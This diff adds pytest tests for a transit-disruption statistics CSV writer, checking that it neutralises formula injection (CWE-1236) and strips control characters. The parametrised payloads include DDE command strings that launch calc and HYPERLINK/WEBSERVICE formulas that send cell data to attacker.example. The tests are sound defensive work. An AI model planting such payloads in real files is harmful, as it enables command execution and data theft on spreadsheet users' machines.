@@ -213,3 +213,200 @@ def test_stats_path_uses_default_dir_when_unspecified() -> None:
 def test_stats_path_honours_base_dir_override(tmp_path: Path) -> None:
     path = stats_utils.stats_path("stoerungen", 2027, base_dir=tmp_path)
     assert path == tmp_path / "stoerungen_2027.csv"
+
+
+# ---- CSV formula-injection defence (CWE-1236) -----------------------------
+#
+# OWASP CWE-1236 ("Improper Neutralization of Formula Elements in a CSV
+# File"): a CSV cell that begins with ``=``, ``+``, ``-``, ``@``, TAB
+# (``\t``), or CR (``\r``) is interpreted as a *formula* by Excel,
+# LibreOffice Calc, and Google Sheets when the file is opened. The
+# append-only stats writers in :mod:`src.utils.stats` accept three
+# operator-/upstream-influenced text fields verbatim:
+#
+# * ``provider`` — comes from the feed item's ``source`` field. Today
+#   the providers hardcode "ÖBB" / "Wiener Linien" / "VOR/VAO", but
+#   ``wl_fetch.py`` re-emits ``ev["source"]`` and ``b["source"]`` from
+#   on-disk cache entries (see :mod:`src.providers.wl_fetch` lines 736
+#   and 858), so a poisoned ``cache/wl/*.json`` can land any string
+#   into ``provider``.
+# * ``location_name`` — extracted from upstream titles/descriptions via
+#   :func:`extract_location_name`. Currently constrained by anchored
+#   ``[A-ZÄÖÜ]`` regexes, but the writer is a public helper that
+#   accepts any string.
+# * ``direction`` — comes from the canonical station directory
+#   (``data/stations.json``) via ``display_name`` in
+#   :mod:`scripts.update_stammstrecke_status`; a poisoned directory
+#   lands anything into the ``direction`` field.
+#
+# These tests exercise the writer directly with formula payloads to
+# pin the boundary defence: the writer must never let a formula prefix
+# survive into the CSV file, regardless of whether *any* current
+# caller exercises the path. Defence-in-depth at the boundary closes
+# the cartesian product of upstream / cache / directory poisoning
+# vectors with a single sanitiser.
+
+
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "=cmd|'/c calc'!A1",
+        "=HYPERLINK(\"http://attacker.example/?d=\"&A1,\"click\")",
+        "+1+1",
+        "-2-3",
+        "@SUM(A1:A9)",
+        "\t=cmd",
+        "\r=cmd",
+    ],
+)
+def test_append_disruption_row_neutralises_formula_provider(
+    tmp_path: Path, payload: str
+) -> None:
+    """Formula prefixes in the *provider* field must not survive into CSV."""
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_disruption_row(
+        timestamp=when,
+        provider=payload,
+        location_name="Wien Floridsdorf",
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
+    assert rows, "writer must persist the row"
+    written_provider = rows[0][3]
+    assert not written_provider.startswith(_FORMULA_PREFIXES), (
+        f"Formula prefix leaked into provider cell: {written_provider!r}"
+    )
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "=cmd|'/c calc'!A1",
+        "@dde('cmd';'/c calc';)",
+        "+IFERROR(1,2)",
+        "-1-1",
+        "\tFloridsdorf",
+        "\rWien Mitte",
+    ],
+)
+def test_append_disruption_row_neutralises_formula_location(
+    tmp_path: Path, payload: str
+) -> None:
+    """Formula prefixes in the *location_name* field must not survive."""
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_disruption_row(
+        timestamp=when,
+        provider="ÖBB",
+        location_name=payload,
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
+    assert rows, "writer must persist the row"
+    written_location = rows[0][4]
+    assert not written_location.startswith(_FORMULA_PREFIXES), (
+        f"Formula prefix leaked into location cell: {written_location!r}"
+    )
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "=cmd|'/c calc'!A1",
+        "+CONCAT(A1,A2)",
+        "@WEBSERVICE(\"http://attacker.example\")",
+        "\t=2+2",
+    ],
+)
+def test_append_stammstrecke_row_neutralises_formula_direction(
+    tmp_path: Path, payload: str
+) -> None:
+    """Formula prefixes in the *direction* field must not survive."""
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_stammstrecke_row(
+        timestamp=when,
+        direction=payload,
+        delay_minutes=5.5,
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stammstrecke_2026.csv")
+    assert rows, "writer must persist the row"
+    written_direction = rows[0][3]
+    assert not written_direction.startswith(_FORMULA_PREFIXES), (
+        f"Formula prefix leaked into direction cell: {written_direction!r}"
+    )
+
+
+def test_append_disruption_row_strips_control_characters(tmp_path: Path) -> None:
+    """NUL/BEL/DEL/etc. must be stripped from text fields before they hit CSV.
+
+    A NUL byte mid-cell is not part of the formula-injection set but
+    breaks downstream CSV readers (the dashboard aggregator uses
+    :mod:`csv.reader` on a :class:`io.StringIO`; a NUL in the middle
+    of a field truncates the cell silently in some reader variants).
+    """
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_disruption_row(
+        timestamp=when,
+        provider="\x00\x01\x07\x1f\x7fÖBB",
+        location_name="Wien\x00 Floridsdorf",
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
+    assert rows[0][3] == "ÖBB"
+    assert rows[0][4] == "Wien Floridsdorf"
+
+
+def test_append_disruption_row_preserves_legitimate_payload_visibly(
+    tmp_path: Path,
+) -> None:
+    """Sanitiser must defang, not silently drop, attacker-controlled payloads.
+
+    Operators must still see the (defanged) value when they read the
+    CSV — silently dropping the payload would hide the indicator-of-
+    compromise. The OWASP-recommended ``'`` prefix keeps the value
+    visible in spreadsheet apps (the leading apostrophe is hidden
+    in display but the cell content is rendered as plain text).
+    """
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_disruption_row(
+        timestamp=when,
+        provider="=HYPERLINK(\"x\",\"y\")",
+        location_name="Wien Floridsdorf",
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
+    assert "HYPERLINK" in rows[0][3], (
+        "Sanitiser must defang, not silently drop, the payload"
+    )
+
+
+def test_append_disruption_row_does_not_modify_safe_text(tmp_path: Path) -> None:
+    """Legitimate provider/location strings must round-trip byte-exactly."""
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_disruption_row(
+        timestamp=when,
+        provider="ÖBB",
+        location_name="Wien Floridsdorf",
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stoerungen_2026.csv")
+    assert rows[0][3] == "ÖBB"
+    assert rows[0][4] == "Wien Floridsdorf"
+
+
+def test_append_stammstrecke_row_does_not_modify_safe_text(tmp_path: Path) -> None:
+    """Legitimate direction strings must round-trip byte-exactly."""
+    when = datetime(2026, 5, 4, 7, 30, tzinfo=VIENNA_TZ)
+    stats_utils.append_stammstrecke_row(
+        timestamp=when,
+        direction="Meidling",
+        delay_minutes=5.5,
+        stats_dir=tmp_path,
+    )
+    _, rows = _read_csv(tmp_path / "stammstrecke_2026.csv")
+    assert rows[0][3] == "Meidling"
+    # Numeric formatting unchanged.
+    assert rows[0][4] == "5.50"
